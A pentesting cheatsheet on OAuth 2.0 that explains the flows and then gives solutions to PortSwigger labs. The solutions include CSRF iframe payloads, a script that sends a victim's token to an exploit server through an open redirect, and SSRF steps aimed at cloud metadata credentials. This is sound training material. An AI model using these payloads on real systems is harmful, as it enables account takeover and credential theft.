# OAuth
 OAuth 2.0 was developed to facilitate secure sharing of specific data between applications. It involves interactions between three key parties: a client application, a resource owner, and the OAuth service provider.

- **Client application** : The website or web application that wants to access the user's data. 
- **Resource owner** : The user whose data the client application wants to access. 
- **OAuth serveice provider** : The website or application that controls the user's data and access. It supports OAuth by providing an API for interacting with an authorization server and a resource server.

## OAuth process
OAuth can be implemented in various ways, referred to as OAuth "flows" or "grant types." The most common ones are the "authorization code" and "implicit" grant types. Both of these broadly follow similar stages :

1. The client application requests access to a subset of the user's data, specifying the grant type and type of access.
2. The user logs into the OAuth service and gives explicit consent for the requested access.
3. The client application receives an access token proving it has permission to access the data, with the process varying by grant type.
4. The client application uses the access token to make API calls and retrieve data from the resource server.

## OAuth grant types
Refference : https://portswigger.net/web-security/oauth/grant-types

The OAuth grant type defines the sequence of steps in the OAuth process and determines how the client application communicates with the OAuth service, including how the access token is sent. Grant types are often called **OAuth flows**.

The OAuth service must be configured to support a specific grant type before the client can initiate the flow. The client specifies the desired grant type in the initial authorization request.

There are multiple grant types, each with varying complexity and security. The most common are the **authorization code** and **implicit** grant types.

## OAuth scopes
For any OAuth grant type, the client application must specify the data it wants to access and the operations it intends to perform. This is done using the `scope` parameter in the authorization request sent to the OAuth service.

When requesting read access to a user's contact list, the scope name might take any of the following forms depending on the OAuth service being used: 
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```
When OAuth is used for authentication, however, the standardized OpenID Connect scopes are often used instead. For example, the scope `openid profile` will grant the client application read access to a predefined set of basic information about the user, such as their email address, username, and so on


### Authorization code grant type
The client application and OAuth service first use redirects to exchange a series of browser-based HTTP requests that initiate the flow.

Authorization grant type is the most secure. Server-side applications should ideally always use this grant type if possible. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-authorization-code-flow.jpg)

The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
This request contains the following noteworthy parameters, usually provided in the query string: 
- **client_id** :  Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service. 
- **redirect_uri** :  The URI to which the user's browser should be redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter. 
- **response_type** : Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization code grant type, the value should be `code`. 
- **scope** : Used to specify which subset of the user's data the client application wants to access. Note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the OpenID Connect specification.
- **state** : Stores a unique, unguessable value that is tied to the current session on the client application. The OAuth service should return this exact value in the response, along with the authorization code. This parameter serves as a form of CSRF token for the client application by making sure that the request to its `/callback` endpoint is from the same person who initiated the OAuth flow. 

### Implicit grant type
Not first obtaining an authorization code and then exchanging it for an access token, but the client application receives the access token immediately after the user gives their consent. 

It is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-implicit-flow.jpg)

The only major difference is that the `response_type` parameter must be set to `token`.
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## OAuth authentication
OAuth authentication is implemented as follows:
1. The user opts to log in using their social media account, prompting the client application to use the social media site's OAuth service to request data like the user's email address.
2. After obtaining an access token, the client application retrieves this data from the resource server, often from a `/userinfo` endpoint.
3. Once the data is received, the client application uses it to log the user in, replacing a username. The access token often serves as a substitute for a traditional password.

## OpenID Connect





## Recon
When using an external OAuth service, you can identify the specific provider by looking at the hostname to which the authorization request is sent. Since these services offer a public API, there is often detailed documentation available, providing useful information such as endpoint names and configuration options.  

Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following standard endpoints: 

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

## Labs Portswigeer 
e.g.) The main request to play with is ```/auth?client_id=...```  
1. Authentication bypass via OAuth implicit flow
>Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.

2. Forced OAuth profile linking
>Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
```
<iframe src="URL/oauth-linking?code=XXXX"></iframe>
```

3. OAuth account hijacking via redirect_uri
>Intercept the whole process of OAuth authentication and observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`, change redirect_uri to your exploit server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

4. Stealing OAuth access tokens via an open redirect
>4.1 Same as the previous one observe ```/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx```.  
>4.2 On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
>4.3 Write the next URL:  
```
redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/
```  
>This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.  
>4.4 Write final payload:  
```
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-xxx.web-security-academy.net/auth?client_id=np1l4fiaizdo4d6r09enk&redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/&response_type=token&nonce=-2091701200&scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

5. SSRF via OpenID dynamic client registration

This task involves exploiting an OAuth service by registering a fake client application and using the logo_uri property to make the OAuth server fetch sensitive metadata from an internal URL. Here's the step-by-step process:
>5.1 Log in to your account and access the OAuth server's configuration file at /.well-known/openid-configuration.  
>5.2 Register a new client application by sending a POST request to /reg. Include a redirect_uris array with an arbitrary URL.  
>5.3 Check the OAuth flow using Burp to see that the "Authorize" page fetches the client application's logo from a specific URL.  
>5.4 Modify the registration request to include a logo_uri property.Replace the logo_uri with a URL pointing to sensitive metadata (http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/).    
>5.5 Trigger the logo fetch request by sending a GET request to the logo's endpoint using the new client ID.  
>5.6 Fetch the logo again using the new client ID to retrieve sensitive information, such as the secret access key, from the OAuth provider's cloud environment.  
